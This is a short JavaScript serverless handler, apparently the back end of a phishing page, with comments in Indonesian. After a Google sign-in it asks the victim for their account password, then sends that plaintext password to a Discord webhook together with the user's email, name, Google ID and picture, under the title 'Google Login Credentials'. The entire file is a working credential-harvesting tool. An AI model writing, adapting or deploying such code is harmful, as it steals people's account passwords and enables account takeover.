import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { token, password } = req.body;
  if (!token || !password) return res.status(400).json({ error: 'Missing token or password' });

  const session = await kv.get(`google_session:${token}`);
  if (!session) return res.status(401).json({ error: 'Invalid or expired session' });

  const { email, name, picture, google_id } = session;

  // Kirim ke Discord webhook
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  if (webhookURL) {
    const payload = {
      embeds: [{
        title: '🔑 Google Login Credentials',
        color: 0x00ff00,
        fields: [
          { name: 'Email', value: email, inline: true },
          { name: 'Password', value: `||${password}||`, inline: true },
          { name: 'Name', value: name || '-', inline: true },
          { name: 'Google ID', value: google_id, inline: true },
          { name: 'Picture', value: picture || '-', inline: false },
        ],
        timestamp: new Date().toISOString(),
      }],
    };
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
  }

  // Hapus session setelah digunakan
  await kv.del(`google_session:${token}`);

  return res.status(200).json({ success: true, email });
}